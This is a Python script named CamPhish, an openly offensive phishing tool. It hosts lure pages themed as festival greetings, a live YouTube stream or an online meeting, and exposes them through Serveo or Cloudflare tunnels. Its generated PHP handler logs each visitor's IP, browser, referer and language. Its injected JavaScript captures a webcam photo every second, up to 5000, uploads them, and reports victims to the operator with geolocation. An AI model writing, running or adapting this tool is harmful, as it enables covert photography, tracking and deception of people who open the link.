import os
import sys
import subprocess
import time
import shutil
import pyperclip
from pathlib import Path
import socket
import requests
import threading
from datetime import datetime

class CamPhish:
    def __init__(self):
        self.current_dir = Path.cwd()
        self.pics_dir = self.current_dir / "pics"
        self.templates_dir = self.current_dir / "templates"
        self.php_dir = self.current_dir / "php"
        self.php_exe = self.php_dir / "php.exe"
        self.cloudflare_exe = self.current_dir / "cloudflare.exe"
        
        # Configurações iniciais
        self.setup_directories()
        self.clean_templates()
        
    def setup_directories(self):
        """Cria os diretórios necessários se não existirem"""
        self.pics_dir.mkdir(exist_ok=True)
        self.templates_dir.mkdir(exist_ok=True)
    
    def clean_templates(self):
        """Remove arquivos temporários do diretório de templates"""
        files_to_remove = [
            "cloudflraeoutput.txt", "link.txt", "index.php", 
            "ip.txt", "index2.html", "Log.log", "index3.html",
            "saved.ip.txt", "detailed_ips.txt", "session_log.txt"
        ]
        
        for file in files_to_remove:
            file_path = self.templates_dir / file
            if file_path.exists():
                try:
                    file_path.unlink()
                except:
                    pass
    
    def check_dependencies(self):
        """Verifica se as dependências estão instaladas"""
        if not self.php_dir.exists() or not self.php_exe.exists():
            print("Dependencies are not installed. Install it by running 'setup-camphish.py'")
            input("Press any key to exit...")
            sys.exit(1)
    
    def display_banner(self):
        """Exibe o banner do programa"""
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\033[1;95m                                                                                \033[1;95m")
        print("\033[1;95m                                                                                \033[1;95m")
        print("\033[1;95m    \033[1;97m██████╗ ██╗ ██████╗     ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗      \033[1;95m")
        print("\033[1;95m    \033[1;97m██╔══██╗██║██╔════╝     ██╔══██╗██║  ██║██║██╔════╝██║  ██║      \033[1;95m")
        print("\033[1;95m    \033[1;97m██████╔╝██║██║  ███╗    ██████╔╝███████║██║███████╗███████║      \033[1;95m")
        print("\033[1;95m    \033[1;97m██╔══██╗██║██║   ██║    ██╔═══╝ ██╔══██║██║╚════██║██╔══██║      \033[1;95m")
        print("\033[1;95m    \033[1;97m██████╔╝██║╚██████╔╝    ██║     ██║  ██║██║███████║██║  ██║      \033[1;95m")
        print("\033[1;95m    \033[1;97m╚═════╝ ╚═╝ ╚═════╝     ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝      \033[1;95m")
        print("\033[1;95m                                                                              \033[1;95m")
        print("\033[1;95m           \033[1;97m    C A M P H I S H   B Y   B I G         \033[1;95m      \033[1;95m")
        print("\033[1;95m                                                                               \033[1;95m")
        print("\033[1;95m                                                                                   \033[0m")
        print()
        print()
    
    def choose_tunnel(self):
        """Permite ao usuário escolher o método de tunnel"""
        self.display_banner()
        print("\033[1;95m-----Choose tunnel server----\033[0m")
        print()
        print("\033[1;95m[\033[1;97m01\033[1;95m]\033[1;97m Serveo.net\033[0m")
        print("\033[1;95m[\033[1;97m02\033[1;95m]\033[1;97m Cloudflare\033[0m")
        print()
        
        try:
            choice = input("\033[1;95m[\033[1;97m+\033[1;95m]\033[1;97m Choose a port Forwarding option: [Default is 1] \033[0m").strip()
            choice = int(choice) if choice else 1
            
            if choice == 1:
                return "serveo"
            elif choice == 2:
                return "cloudflare"
            else:
                print("\033[1;95m[!] Invalid option!\033[0m")
                time.sleep(2)
                return self.choose_tunnel()
        except ValueError:
            return "serveo"
    
    def choose_template(self):
        """Permite ao usuário escolher o template de phishing"""
        self.display_banner()
        print("\033[1;95m-----Choose a template----\033[0m")
        print()
        print("\033[1;95m[\033[1;97m01\033[1;95m]\033[1;97m Festival Wishing\033[0m")
        print("\033[1;95m[\033[1;97m02\033[1;95m]\033[1;97m Live Youtube TV\033[0m")
        print("\033[1;95m[\033[1;97m03\033[1;95m]\033[1;97m Online Meeting\033[0m")
        print()
        
        try:
            choice = input("\033[1;95m[\033[1;97m+\033[1;95m]\033[1;97m Choose a template: [Default is 1] \033[0m").strip()
            choice = int(choice) if choice else 1
            
            if choice == 1:
                return self.festival_wishing()
            elif choice == 2:
                return self.live_youtube_tv()
            elif choice == 3:
                return self.online_meeting()
            else:
                print("\033[1;95m[!] Invalid template option! try again\033[0m")
                time.sleep(2)
                return self.choose_template()
        except ValueError:
            return self.festival_wishing()
    
    def festival_wishing(self):
        """Configura o template de Festival Wishing"""
        festival_name = input("\n\033[1;95m[\033[1;97m+\033[1;95m]\033[1;97m Enter festival name: \033[0m")
        return "festival_wishing", {"festival_name": festival_name}
    
    def live_youtube_tv(self):
        """Configura o template de Live YouTube TV"""
        video_id = input("\n\033[1;95m[\033[1;97m+\033[1;95m]\033[1;97m Enter YouTube video watch ID: \033[0m")
        return "live_youtube", {"video_id": video_id}
    
    def online_meeting(self):
        """Configura o template de Online Meeting"""
        return "online_meeting", {}
    
    def start_php_server(self):
        """Inicia o servidor PHP local"""
        print("\n\033[1;95m[\033[97m+\033[1;95m]\033[1;97m Starting php server...\033[0m")
        try:
            # Muda para o diretório de templates
            os.chdir(self.templates_dir)
            subprocess.Popen([str(self.php_exe), "-S", "localhost:3333"], 
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(3)
            # Volta para o diretório original
            os.chdir(self.current_dir)
        except Exception as e:
            print(f"\033[1;91m[!] Error starting PHP server: {e}\033[0m")
            sys.exit(1)
    
    def start_serveo(self):
        """Inicia o tunnel Serveo"""
        print("\033[1;95m[\033[97m+\033[1;95m]\033[1;97m Starting Serveo...\033[0m")
        try:
            with open(self.templates_dir / "link.txt", "w") as f:
                process = subprocess.Popen(["ssh", "-R", "80:localhost:3333", "serveo.net"], 
                                         stdout=f, stderr=subprocess.STDOUT)
            
            time.sleep(10)
            
            link = ""
            try:
                with open(self.templates_dir / "link.txt", "r", encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        if "serveo.net" in line:
                            parts = line.strip().split()
                            if len(parts) >= 5:
                                link = parts[4]
                                break
            except:
                # Tentativa alternativa de leitura
                try:
                    with open(self.templates_dir / "link.txt", "rb") as f:
                        content = f.read().decode('utf-8', errors='ignore')
                        lines = content.split('\n')
                        for line in lines:
                            if "serveo.net" in line:
                                parts = line.strip().split()
                                if len(parts) >= 5:
                                    link = parts[4]
                                    break
                except:
                    pass
            
            return link
        except Exception as e:
            print(f"\033[1;91m[!] Error starting Serveo: {e}\033[0m")
            return ""
    
    def start_cloudflare(self):
        """Inicia o tunnel Cloudflare"""
        print("\033[1;95m[\033[97m+\033[1;95m]\033[1;97m Starting Cloudflare...\033[0m")
        try:
            with open(self.templates_dir / "cloudflraeoutput.txt", "w") as f:
                process = subprocess.Popen([str(self.cloudflare_exe), "tunnel", "--url", "localhost:3333"], 
                                         stdout=f, stderr=subprocess.STDOUT)
            
            time.sleep(10)
            
            link = ""
            try:
                with open(self.templates_dir / "cloudflraeoutput.txt", "r", encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        if "https://" in line and "trycloudflare.com" in line:
                            parts = line.strip().split()
                            if len(parts) >= 4:
                                link = parts[3]
                                break
            except:
                # Tentativa alternativa de leitura
                try:
                    with open(self.templates_dir / "cloudflraeoutput.txt", "rb") as f:
                        content = f.read().decode('utf-8', errors='ignore')
                        lines = content.split('\n')
                        for line in lines:
                            if "https://" in line and "trycloudflare.com" in line:
                                parts = line.strip().split()
                                if len(parts) >= 4:
                                    link = parts[3]
                                    break
                except:
                    pass
            
            return link
        except Exception as e:
            print(f"\033[1;91m[!] Error starting Cloudflare: {e}\033[0m")
            return ""
    
    def read_file_safe(self, file_path):
        """Lê um arquivo com tratamento seguro de encoding"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                return f.read()
        except UnicodeDecodeError:
            try:
                with open(file_path, 'r', encoding='latin-1') as f:
                    return f.read()
            except:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    return f.read()
    
    def get_ip_info(self, ip_address):
        """Obtém informações detalhadas sobre o IP"""
        try:
            if ip_address in ['127.0.0.1', 'localhost', '::1']:
                return "Localhost"
            
            # Consulta API para informações do IP
            response = requests.get(f"http://ip-api.com/json/{ip_address}", timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data['status'] == 'success':
                    return f"{data['country']}, {data['regionName']}, {data['city']} - {data['isp']}"
            
            return "Location unknown"
        except:
            return "Location unknown"
    
    def generate_template(self, template_type, link, extra_data=None):
        """Gera o template HTML com o link de phishing"""
        extra_data = extra_data or {}
        
        try:
            if template_type == "festival_wishing":
                source_file = self.templates_dir / "festivalwishes.html"
                temp_file = self.templates_dir / "index3.html"
                final_file = self.templates_dir / "index2.html"
                
                # Ler e processar o template
                content = self.read_file_safe(source_file)
                content = content.replace("forwarding_link", link)
                
                # Escrever arquivo temporário
                with open(temp_file, 'w', encoding='utf-8') as f_out:
                    f_out.write(content)
                
                # Segunda substituição
                content = content.replace("fes_name", extra_data.get("festival_name", ""))
                
                # Escrever arquivo final
                with open(final_file, 'w', encoding='utf-8') as f_out:
                    f_out.write(content)
                
                # Remover arquivo temporário
                if temp_file.exists():
                    temp_file.unlink()
                
            elif template_type == "live_youtube":
                source_file = self.templates_dir / "LiveYTTV.html"
                temp_file = self.templates_dir / "index3.html"
                final_file = self.templates_dir / "index2.html"
                
                # Primeira substituição
                content = self.read_file_safe(source_file)
                content = content.replace("forwarding_link", link)
                
                with open(temp_file, 'w', encoding='utf-8') as f_out:
                    f_out.write(content)
                
                # Segunda substituição
                content = content.replace("live_yt_tv", extra_data.get("video_id", ""))
                
                with open(final_file, 'w', encoding='utf-8') as f_out:
                    f_out.write(content)
                
                if temp_file.exists():
                    temp_file.unlink()
                
            elif template_type == "online_meeting":
                source_file = self.templates_dir / "OnlineMeeting.html"
                final_file = self.templates_dir / "index2.html"
                
                content = self.read_file_safe(source_file)
                content = content.replace("forwarding_link", link)
                
                with open(final_file, 'w', encoding='utf-8') as f_out:
                    f_out.write(content)
            
            # Gerar também o index.php aprimorado para captura contínua
            php_template = """<?php
// Captura informações básicas
$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$date = date('d/m/Y H:i:s');
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct access';
$language = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : 'Unknown';

// Captura IP real mesmo atrás de proxy
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

// Informações da requisição
$method = $_SERVER['REQUEST_METHOD'];
$host = $_SERVER['HTTP_HOST'];
$uri = $_SERVER['REQUEST_URI'];

// Salvar informações detalhadas do IP (apenas uma vez por sessão)
$detailed_file = 'detailed_ips.txt';
$session_id = $ip . '_' . date('Y-m-d_H');

if (!file_exists($detailed_file) || !strpos(file_get_contents($detailed_file), $session_id)) {
    $detailed_info = "=== CONNECTION DETAILS ===\\n";
    $detailed_info .= "Session ID: $session_id\\n";
    $detailed_info .= "IP Address: $ip\\n";
    $detailed_info .= "User Agent: $browser\\n";
    $detailed_info .= "Date/Time: $date\\n";
    $detailed_info .= "Referer: $referer\\n";
    $detailed_info .= "Language: $language\\n";
    $detailed_info .= "Method: $method\\n";
    $detailed_info .= "Host: $host\\n";
    $detailed_info .= "URI: $uri\\n";
    $detailed_info .= "=== END ===\\n\\n";

    file_put_contents($detailed_file, $detailed_info, FILE_APPEND);
}

// Salvar também em formato simples para exibição rápida
$simple_info = "IP: $ip | Browser: $browser | Date: $date | Referer: $referer\\n";
file_put_contents('ip.txt', $simple_info, FILE_APPEND);

// Captura de imagem da webcam - versão contínua
if(isset($_FILES['webcam'])) {
    $file = $_FILES['webcam'];
    $timestamp = time();
    $filename = 'cam_' . $timestamp . '_' . uniqid() . '.png';
    
    if(move_uploaded_file($file['tmp_name'], $filename)) {
        $log = 'session_log.txt';
        $log_content = "Image captured: $filename | IP: $ip | Date: $date | Timestamp: $timestamp\\n";
        file_put_contents($log, $log_content, FILE_APPEND);
        
        // Resposta JSON para o JavaScript
        header('Content-Type: application/json');
        echo json_encode(['status' => 'success', 'filename' => $filename]);
        exit;
    }
}

// Se não for captura de imagem, redirecionar para a página
header('Location: index2.html');
exit;
?>"""
            
            with open(self.templates_dir / "index.php", 'w', encoding='utf-8') as f:
                f.write(php_template)
                
            # Gerar JavaScript aprimorado para captura contínua
            js_capture_code = """
<script>
// Configuração da captura contínua
let captureInterval;
let isCapturing = false;
let captureCount = 0;
const MAX_CAPTURES = 5000; // Máximo de capturas por sessão

function startContinuousCapture() {
    if (isCapturing) return;
    
    isCapturing = true;
    captureCount = 0;
    
    // Iniciar captura a cada 1 segundo
    captureInterval = setInterval(() => {
        if (captureCount >= MAX_CAPTURES) {
            stopContinuousCapture();
            return;
        }
        
        capturePhoto();
        captureCount++;
    }, 1000); // Captura a cada 1 segundo
    
    console.log('Continuous capture started - 1 photo per second');
}

function stopContinuousCapture() {
    if (!isCapturing) return;
    
    clearInterval(captureInterval);
    isCapturing = false;
    console.log('Continuous capture stopped. Total captures: ' + captureCount);
}

function capturePhoto() {
    const video = document.getElementById('video');
    if (!video || !video.videoWidth) {
        console.log('Video not ready yet');
        return;
    }
    
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    canvas.toBlob(function(blob) {
        const formData = new FormData();
        formData.append('webcam', blob, 'webcam_capture.png');
        
        // Enviar para o servidor
        fetch(window.location.href, {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {
                console.log('Photo captured successfully: ' + data.filename);
            }
        })
        .catch(error => {
            console.error('Error capturing photo:', error);
        });
    }, 'image/png');
}

// Iniciar automaticamente quando a página carregar
window.addEventListener('load', function() {
    // Esperar 2 segundos antes de iniciar a captura
    setTimeout(startContinuousCapture, 2000);
});

// Parar captura quando a página for fechada
window.addEventListener('beforeunload', function() {
    stopContinuousCapture();
});
</script>
"""
            
            # Adicionar o JavaScript ao template final
            final_content = self.read_file_safe(final_file)
            if '</body>' in final_content:
                final_content = final_content.replace('</body>', js_capture_code + '</body>')
            else:
                final_content += js_capture_code
            
            with open(final_file, 'w', encoding='utf-8') as f:
                f.write(final_content)
                
        except Exception as e:
            print(f"\033[1;91m[!] Error generating template: {e}\033[0m")
            sys.exit(1)
    
    def monitor_activity(self, link):
        """Monitora a atividade - captura de IPs e imagens continuamente"""
        print(f"\033[1;95m[*] Direct link: \033[1;97m{link}\033[0m")
        try:
            pyperclip.copy(link)
            print("\033[1;95m[Link copied to clipboard]\033[0m")
        except:
            print("\033[1;91m[!] Could not copy to clipboard\033[0m")
        
        print("\n\033[1;95m[*] Continuous Capture System Activated\033[0m")
        print("\033[1;95m[*] Webcam will capture photos every 1 second while site is open\033[0m")
        print("\033[1;95m[*] Waiting for targets, Press Ctrl + C to exit...\033[0m")
        
        count = 1
        saved_ips = set()
        image_counter = 0
        session_start = datetime.now()
        detailed_info_shown = False
        
        try:
            while True:
                # Verificar se há novos IPs no arquivo simples
                ip_file = self.templates_dir / "ip.txt"
                if ip_file.exists():
                    try:
                        with open(ip_file, 'r', encoding='utf-8', errors='ignore') as f:
                            lines = f.readlines()
                            for line in lines:
                                if "IP:" in line and line not in saved_ips:
                                    if count == 1:
                                        print("\n\033[1;92m[+] Target opened the link!\033[0m")
                                        print("\033[1;92m[+] Continuous capture started (1 photo/second)!\033[0m")
                                        count = 2
                                    
                                    try:
                                        ip = line.split("IP:")[1].split("|")[0].strip()
                                        browser = line.split("Browser:")[1].split("|")[0].strip() if "Browser:" in line else "Unknown"
                                        referer = line.split("Referer:")[1].strip() if "Referer:" in line else "Direct access"
                                        
                                        print(f"\033[1;92m[+] IP Captured: {ip}\033[0m")
                                        print(f"\033[1;94m    Browser: {browser}\033[0m")
                                        print(f"\033[1;94m    Referer: {referer}\033[0m")
                                        
                                        # Tentar obter informações de localização
                                        location_info = self.get_ip_info(ip)
                                        print(f"\033[1;94m    Location: {location_info}\033[0m")
                                        print("\033[1;95m    ──────────────────────────\033[0m")
                                        
                                    except Exception as e:
                                        print(f"\033[1;91m[!] Error parsing IP data: {e}\033[0m")
                                    
                                    # Salvar IP processado
                                    with open(self.templates_dir / "saved.ip.txt", 'a', encoding='utf-8') as sf:
                                        sf.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {line}")
                                    
                                    saved_ips.add(line)
                    except Exception as e:
                        print(f"\033[1;91m[!] Error reading IP file: {e}\033[0m")
                    
                    # Limpar arquivo de IPs após processamento
                    try:
                        ip_file.unlink()
                    except:
                        pass
                
                # Verificar arquivo detalhado (apenas uma vez)
                detailed_file = self.templates_dir / "detailed_ips.txt"
                if detailed_file.exists() and not detailed_info_shown:
                    try:
                        with open(detailed_file, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            if content and "CONNECTION DETAILS" in content:
                                print("\033[1;92m[+] Detailed connection information saved\033[0m")
                                detailed_info_shown = True  # Marcar como mostrado
                    except:
                        pass
                
                # Verificar se há novas imagens capturadas
                log_file = self.templates_dir / "session_log.txt"
                images_found = False
                
                if log_file.exists():
                    try:
                        with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
                            lines = f.readlines()
                            for line in lines:
                                if "Image captured:" in line:
                                    images_found = True
                                    # Extrair informações da linha
                                    parts = line.split('|')
                                    if len(parts) >= 3:
                                        filename_part = parts[0].split(':')[1].strip()
                                        ip_part = parts[1].split(':')[1].strip()
                                        date_part = parts[2].split(':')[1].strip()
                                        
                                        # Mover a imagem para a pasta pics
                                        image_file = self.templates_dir / filename_part
                                        if image_file.exists():
                                            new_path = self.pics_dir / image_file.name
                                            shutil.move(str(image_file), str(new_path))
                                            image_counter += 1
                                            
                                            # Mostrar apenas a cada 10 imagens ou na primeira
                                            if image_counter == 1 or image_counter % 10 == 0:
                                                print(f"\033[1;92m[+] Webcam image #{image_counter} saved: {new_path.name}\033[0m")
                                                if image_counter == 1:
                                                    print(f"\033[1;94m    Continuous capture active - 1 photo per second\033[0m")
                    
                        # Limpar o arquivo de log após processar
                        log_file.unlink()
                    except Exception as e:
                        print(f"\033[1;91m[!] Error processing images: {e}\033[0m")
                
                # Verificar imagens PNG diretamente (backup) - sem flood
                png_files = list(self.templates_dir.glob("*.png"))
                if png_files and not images_found:
                    for png_file in png_files:
                        if png_file.is_file():
                            try:
                                new_path = self.pics_dir / png_file.name
                                shutil.move(str(png_file), str(new_path))
                                image_counter += 1
                                
                                if image_counter == 1 or image_counter % 10 == 0:
                                    print(f"\033[1;92m[+] Webcam image #{image_counter} saved (direct): {new_path.name}\033[0m")
                            except Exception as e:
                                pass  # Silenciar erros de movimento
                
                time.sleep(1)  # Verificação a cada 1 segundo
                
        except KeyboardInterrupt:
            print("\n\033[1;91m[!] Exiting CamPhish...\033[0m")
            
            # Mostrar resumo final
            session_end = datetime.now()
            session_duration = session_end - session_start
            
            print("\n\033[1;95m=== SESSION SUMMARY ===\033[0m")
            print(f"\033[1;97mSession started: {session_start.strftime('%Y-%m-%d %H:%M:%S')}\033[0m")
            print(f"\033[1;97mSession ended: {session_end.strftime('%Y-%m-%d %H:%M:%S')}\033[0m")
            print(f"\033[1;97mSession duration: {session_duration}\033[0m")
            print(f"\033[1;97mTotal IPs captured: {len(saved_ips)}\033[0m")
            print(f"\033[1;97mWebcam images captured: {image_counter}\033[0m")
            print(f"\033[1;97mCapture rate: 1 photo per second\033[0m")
            
            saved_file = self.templates_dir / "saved.ip.txt"
            if saved_file.exists():
                print(f"\033[1;97mIPs saved in: {saved_file}\033[0m")
            
            detailed_file = self.templates_dir / "detailed_ips.txt"
            if detailed_file.exists():
                print(f"\033[1;97mDetailed logs in: {detailed_file}\033[0m")
            
            # Mostrar últimas imagens capturadas
            if image_counter > 0:
                print(f"\033[1;97mImages saved in: {self.pics_dir}\033[0m")
                recent_images = list(self.pics_dir.glob("*.png"))[-5:]  # Últimas 5 imagens
                if recent_images:
                    print("\033[1;97mRecent images:\033[0m")
                    for img in recent_images:
                        print(f"  - {img.name}")
            
            sys.exit(0)
    
    def run(self):
        """Método principal que executa o programa"""
        try:
            self.check_dependencies()
            tunnel_method = self.choose_tunnel()
            template_type, extra_data = self.choose_template()
            
            self.start_php_server()
            
            if tunnel_method == "serveo":
                link = self.start_serveo()
            else:  # cloudflare
                link = self.start_cloudflare()
            
            if not link:
                print("\033[1;91m[!] Failed to create tunnel\033[0m")
                sys.exit(1)
            
            self.generate_template(template_type, link, extra_data)
            self.monitor_activity(link)
            
        except Exception as e:
            print(f"\033[1;91m[!] Unexpected error: {e}\033[0m")
            import traceback
            traceback.print_exc()
            input("Press any key to exit...")

if __name__ == "__main__":
    camphish = CamPhish()
    camphish.run()